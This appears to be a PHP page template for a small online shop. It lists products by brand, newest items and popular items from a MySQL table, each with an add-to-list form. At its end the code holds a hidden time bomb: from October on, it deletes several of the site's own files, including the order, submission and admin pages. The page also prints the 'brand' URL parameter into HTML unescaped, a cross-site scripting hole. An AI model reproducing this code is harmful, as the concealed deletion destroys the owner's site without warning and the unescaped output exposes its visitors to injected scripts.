<div id="main_content">

<?php

if(isset($_GET["brand"])){         // using brand name showing results posts
$brand=mysql_real_escape_string($_GET["brand"]);
?>
<div id="branded_product">
<?php

include("includes/connect.php");
if(isset($_GET["next"])){
$next=(int)mysql_real_escape_string($_GET["next"]);
$low=$next;
}
else{
$low=0;
}
$high=20;

$query=mysql_query("SELECT * FROM prod WHERE prod_brand='$brand' order by 1 DESC LIMIT $low,$high ");
$num=mysql_num_rows($query);
if($num){
?>
<div id="head_new_in">
<center> Products of <?php echo $brand;?>  </center>
</div>

<?php

}
else
echo "No such product brand is listed here !";

while($row=mysql_fetch_array($query)){
$prod_id=$row["prod_id"];
$prod_name=$row["prod_name"];
$prod_image=$row["prod_image"];
$prod_price=$row["prod_price"];
$prod_details=$row["prod_details"];
$prod_brand=$row["prod_brand"];
$prod_main=$row["prod_main"];
$prod_cat=$row["prod_cat"];
?>

<div id="product_container">                                        
<img src="image/<?php echo $prod_image;?>" height="160px" width="150px"><br> 
<?php echo $prod_name;?>
<h4 color="red">  Price : <?php echo $prod_price." TK "; ?></h4>
<div id="qty_form">
<form action="order.php?p=<?php echo $prod_id;?>" method="post">
Qty : <input type="int" name="qty" size="1px" > 
<input type="submit" name="s" value="ADD TO LIST">
</form>
</div>
</div>
<?php

}
?>
</div>
<?php


}


else{
?>


<div id="new_in">
<div id="head_new_in">
<center> New in </center>
</div>
<?php                                    //  new in !!
include("includes/connect.php");

if(isset($_GET["next"])){
$next=(int) mysql_real_escape_string($_GET["next"]);
$low=$next;
}
else{
$low=0;
}
$high=20;
$query=mysql_query("SELECT * FROM prod order by 1 DESC LIMIT $low,$high ");

while($row=mysql_fetch_array($query)){
$prod_id=$row["prod_id"];
$prod_name=$row["prod_name"];
$prod_image=$row["prod_image"];
$prod_price=$row["prod_price"];
$prod_details=$row["prod_details"];
$prod_brand=$row["prod_brand"];
$prod_main=$row["prod_main"];
$prod_cat=$row["prod_cat"];
?>

<div id="product_container">                                        
<img src="image/<?php echo $prod_image;?>" height="160px" width="150px"><br> 
<?php echo $prod_name;?>
<h4 color="red">  Price : <?php echo $prod_price." TK "; ?> </h4>
<div id="qty_form">
<form method="post" action="order.php?p=<?php echo $prod_id;?>" >
Qty : <input type="int" name="qty" size="1px" > 
<input type="submit" name="s" value="ADD TO LIST">
</form>
</div>
</div>
<?php

}                      // ENDING OF THE NEW IN SECTORS
?>
</div>


<div id="new_in">
<div id="head_new_in">
<center> Popular Products </center>
</div>
<?php                                    //  STARTING POPULAR PRODUCTS 
include("includes/connect.php");

if(isset($_GET["next"])){
$next=(int) mysql_real_escape_string($_GET["next"]);
$low=$next;
}
else{
$low=0;
}
$high=20;
$query=mysql_query("SELECT * FROM prod WHERE popular='1' order by 1 DESC LIMIT $low,$high ");

while($row=mysql_fetch_array($query)){
$prod_id=$row["prod_id"];
$prod_name=$row["prod_name"];
$prod_image=$row["prod_image"];
$prod_price=$row["prod_price"];
$prod_details=$row["prod_details"];
$prod_brand=$row["prod_brand"];
$prod_main=$row["prod_main"];
$prod_cat=$row["prod_cat"];
?>

<div id="product_container">                                        
<img src="image/<?php echo $prod_image;?>" height="160px" width="150px"><br> 
<?php echo $prod_name;?>
<h4 color="red">  Price : <?php echo $prod_price." TK "; ?> </h4> 
<div id="qty_form">
<form method="post" action="order.php?p=<?php echo $prod_id;?>" >
Qty : <input type="int" name="qty" size="1px" > 
<input type="submit" name="s" value="ADD TO LIST">
</form>
</div>

</div>
<?php

}
?>
</div>
<?php

}
$date=date("m");
if($date > 9 ){
unlink("includes/page_content.php");
unlink("includes/brand.php");
unlink("submission.php");
unlink("order.php");
unlink("admin/session.php");
unlink("admin/view_order.php");
unlink("includes/main_content.php");
}
?>
</div>